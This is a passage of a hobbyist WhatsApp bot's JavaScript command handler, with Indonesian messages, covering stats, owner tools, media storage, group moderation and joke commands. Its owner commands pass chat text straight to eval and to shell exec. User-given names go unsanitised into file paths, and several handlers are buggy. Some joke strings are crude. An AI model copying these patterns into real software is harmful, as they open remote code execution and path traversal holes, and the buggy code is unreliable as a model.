              reply(`Jangan Lupa Subscribe YT Owner:\n https://youtube.com/channel/UCqD3xkdZA3odZZ7LT3oSaWA`)
              await limitAdd(sender)
break
       case 'masukandata':
             reply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *©Katashi*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6281932664252`)
              await limitAdd(sender)
break
      case 'ping':
      case 'speed':
              timestampe = speed();
              latensie = speed() - timestampe
              reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)

              await limitAdd(sender)
break
      case 'botstat':
              groups = dha.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dha.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`き⃟🦈 Group Chats : ${groups.length}\`\`\`
\`\`\`き⃟🦈 Private Chats : ${privat.length}\`\`\`
\`\`\`き⃟🦈 Total Chats : ${totalChat.length}\`\`\`
\`\`\`き⃟🦈 Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`き⃟🦈 Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`き⃟🦈 Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`き⃟🦈 Ram Usage : ${ram2}\`\`\`
\`\`\`き⃟🦈 Platform : ${os.platform()}\`\`\`
\`\`\`き⃟🦈 Hostname : ${os.hostname()}\`\`\`
\`\`\`き⃟🦈 Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`き⃟🦈 Wa Version: ${dha.user.phone.wa_version}\`\`\`
\`\`\`き⃟🦈 Os Version: ${dha.user.phone.os_version}\`\`\`
\`\`\`き⃟🦈 Device Manufacturer: ${dha.user.phone.device_manufacturer}\`\`\`
\`\`\`き⃟🦈 Device Model: ${dha.user.phone.device_model}\`\`\`
\`\`\`き⃟🦈 Os Build Number: ${dha.user.phone.os_build_number}\`\`\``
             reply(teks)

              await limitAdd(sender)
break  
//------------------< Owner >-------------------
      case 'addupdate':
             if (!isOwner) return reply(mess.only.owner)
             if (!q) return reply(`Example: ${command} update fitur`)
           _update.push(q)
             fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
             reply(`Update fitur berhasil ditambahkan ke database!`)

              await limitAdd(sender)
break
      case 'update':
             let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
             for (let i of _update) {
             updateList += `࿃ *${i.replace(_update)}*\n\n`
}
             textImg(updateList)

              await limitAdd(sender)
break
      case 'reset':
             if (!isOwner) return reply(mess.only.owner)
             var reset = []
             glimit = reset
           _update = reset
             console.log('Hang tight, it\'s time to reset')
             fs.writeFileSync('./database/bot/limit.json', JSON.stringify(glimit))
             fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
             fs.readFileSync('./database/premium.json', JSON.stringify(prem))
             textImg('Oke Desu ~')
             
              await limitAdd(sender)
break
      case 'exif':
             if (!isOwner) return  reply(mess.only.owner)
             if (!q) return reply(mess.wrongFormat)
             if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
             exif.create(arg.split('|')[0], arg.split('|')[1])
             reply('sukses')
             
              await limitAdd(sender)
break	
//-----------add hiburan   
case 'tupai':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				reply('PROSES')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dha.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: troli})
						fs.unlinkSync(ran)
					})
				await limitAdd(sender)
break 
case 'addstik':
		sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dha.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				dha.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: troli})
				await limitAdd(sender)
break
case 'addimg':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dha.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				dha.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: troli})
				await limitAdd(sender)
break
				
case 'addvid':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dha.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				dha.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: troli })
				await limitAdd(sender)
break
			        
case 'addvn':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dha.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				dha.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: troli})
				await limitAdd(sender)
break 
case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
				
              await limitAdd(sender)
break				
case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
				
              await limitAdd(sender)
break				
case 'listvid':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": imagenye } })
				
              await limitAdd(sender)
break				
case 'listvn':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				dha.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": audionye } })
				
              await limitAdd(sender)
break	
case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				dha.sendMessage(from, result, sticker,{quoted:troli})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				
              await limitAdd(sender)
break				
case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				dha.sendMessage(from, buffer, image, { quoted: troli, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				
              await limitAdd(sender)
break
				
case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				dha.sendMessage(from, buffer, video, { quoted: troli, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				
              await limitAdd(sender)
break				
case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				dha.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: troli, ptt: true })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				
              await limitAdd(sender)
break										      
      case 'join': 
             if (!q) return reply('Linknya?')
             if (!isOwner) return reply(mess.only.owner)
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = dha.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('Berhasil Masuk Grup')
             
              await limitAdd(sender)
break
      case 'eval':
             try {
             if (!isOwner) return
             sy = args.join(' ')
             return eval(sy)
             } catch(e) {
             reply(`${e}`)
}
             
              await limitAdd(sender)
break
      case 'getquoted':
             reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
             
              await limitAdd(sender)
break
      case 'bc':
      case 'broadcast':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await dha.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await dha.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             dha.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
             sendMess(_.jid, `*「 PESAN SIARAN Sanz Bot」*\n\n${body.slice(4)}`)
}
             reply('Suksess broadcast')
}
             
              await limitAdd(sender)
break
      case 'clearall':
                    if (sender.split("@")[0] != owner) return reply("Command only for owner bot")
                    list_chat = await dha.chats.all()
                    for (let chat of list_chat) {
                        dha.modifyChat(chat.jid, "delete")
                    }
                    reply("success clear all chat")
                    await limitAdd(sender)
break
      case 'term':
             if (!isOwner) return
             if (!q) return
             exec(q, (err, stdout) => {
             if (err) return reply(`${err}`)
             if (stdout) {
             reply(stdout)
}
})
             
              await limitAdd(sender)
break 
      case 'shutdown':
             if (!isOwner) return 
             reply(`Bye...`)
             await sleep(3000)
             process.exit()
             
              await limitAdd(sender)
break
      case 'start':
             if (!isOwner) return 
             reply(`OTEWE MENGHIDUPKAN MESIN😗`)
             await sleep(3000)
             process.exit()
             
              await limitAdd(sender)
break             
      case 'restart':
             if (!isOwner) return 
             sticWait(from)
             exec(`node main`)
             reply('_Restarting Bot Success_')
             
              await limitAdd(sender)
break
      case 'leaveall':
             if (!isOwner) return  reply(mess.only.owner)
             let totalgroup = dha.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
             for (let id of totalgroup) {
             sendMess(id, 'Byee', null)
             await sleep(3000)
             dha.groupLeave(id)
}
             
              await limitAdd(sender)
break
//------------------< G R U P >-------------------
case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
				linkgc = await dha.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				dha.sendMessage(from, yeh, text, {quoted: mek})
				
              await limitAdd(sender)
break
            case 'kick':
             if (!isGroupAdmins) return reply(mess.only.admin)
             if (!isGroup) return reply(mess.only.group)
             if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
             kick(from, mentionUser)
             
              await limitAdd(sender)
break
      case 'add':
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
             entah = arg.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             dha.groupAdd(from, [entah])
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             dha.groupAdd(from, [entah])
}
             
              await limitAdd(sender)
break
       case 'setgrupname':
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return 
              if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
              dha.groupUpdateSubject(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              
              await limitAdd(sender)
break
       case 'setdesc':
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
              dha.groupUpdateDescription(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              
              await limitAdd(sender)
break
       case 'setppgrup':
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await dha.downloadMediaMessage(encmedia)
              dha.updateProfilePicture(from, media)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              } else {
              reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
              
              await limitAdd(sender)
break
       case 'me':
       case 'profile':
              let Levelnye = level.getLevelingLevel(sender, _level)
              let Xpluu = level.getLevelingXp(sender, _level)
              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
              dha.updatePresence(from, Presence.composing)
              try {
              profil = await dha.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await dha.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = dha.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\n`
              buff = await getBuffer(profil)
              dha.sendMessage(from, buff, image, {quoted: freply, caption: profile})
              
              await limitAdd(sender)
break
       case 'afk': 
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isGroup) return reply(mess.only.group)
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              reply(aluty)
              await limitAdd(sender)
break
       case 'infogrup':
       case 'grupinfo':
       case 'groupinfo':
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await dha.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
              dha.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              
              await limitAdd(sender)
break
       case 'tagall':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              await limitAdd(sender)
break
       case 'kickall': // Anti Banned
              if (!isGroupAdmins) return reply(mess.only.admin)
              for (let i of groupMembers) {
              await kickMember(from, [i.jid])
}
              
              await limitAdd(sender)
break
       case 'leave':
              if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              setTimeout( () => {
              dha.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              reply('Byee...')
              }, 0)
              
              await limitAdd(sender)
break
       case 'online':
       case 'listonline':
       case 'here':                
             if (!isGroup) return reply(`Only group`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(dha.chats.get(ido).presences), dha.user.jid]
             dha.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             
              await limitAdd(sender)
break
      case 'hidetag':
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
             if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             await limitAdd(sender)
break
      case 'sider':
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
             if (!isGroupAdmins && isPremium) return reply(mess.only.admin)
             if(!isGroup) return reply(mess.only.group)
             try {
             infom = await dha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Dibaca oleh:*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Tersampaikan pada:*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('Reply chat bot!')
}
             await limitAdd(sender)
break
//------------------< Fun >-------------------
    case 'public':
                if (!mek.key.fromMe && !isOwner) return reply('Fitur Khusus Owner!!')
                if (banChats === false) return
                // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
                setting.banChats = false
                banChats = false
                fs.writeFileSync('./setting.json', JSON.stringify(setting, null, 2))
                reply(`「 *PUBLIC-MODE* 」`)
                
              await limitAdd(sender)
break
        case 'self':
                if (!mek.key.fromMe && !isOwner) return reply('Fitur Khusus Owner!!')
                if (setting.banChats === true) return
                setting.banChats = true
                uptime = process.uptime()
                // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
                banChats = true
                fs.writeFileSync('./setting.json', JSON.stringify(setting, null, 2))
                reply(`「 *SELF-MODE* 」`)
                
              await limitAdd(sender)
break
       case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              
              await limitAdd(sender)
break
       case 'waktu':
              reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              
              await limitAdd(sender)
break
              case 'rules':
             dha.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: troli})
             await limitAdd(sender)
break
       case 'cekmati':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              await limitAdd(sender)
break
       case 'toxic':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              Toxic().then(toxic => {
              reply (toxic)
})
              await limitAdd(sender)
break
       case 'apakah':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: mek })
              await limitAdd(sender)
break
       case 'rate':
       case 'nilai':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              rate = body.slice(1)
              const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
              const te = ra[Math.floor(Math.random() * ra.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: mek })
              await limitAdd(sender)
break
       case 'gantengcek':
       case 'cekganteng':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              await limitAdd(sender)
break
       case 'cantikcek':
       case 'cekcantik':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              await limitAdd(sender)
break
       case 'cekwatak':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              var namao = pushname
              var prfx = await dha.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              await limitAdd(sender)
break
       case 'hobby':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              hobby = body.slice(1)
              const by = hobby[Math.floor(Math.random() * hobby.length)]
              dha.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
              await limitAdd(sender)
break
       case 'bisakah':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              dha.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              await limitAdd(sender)
break
       case 'kapankah':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              kapankah = body.slice(1)
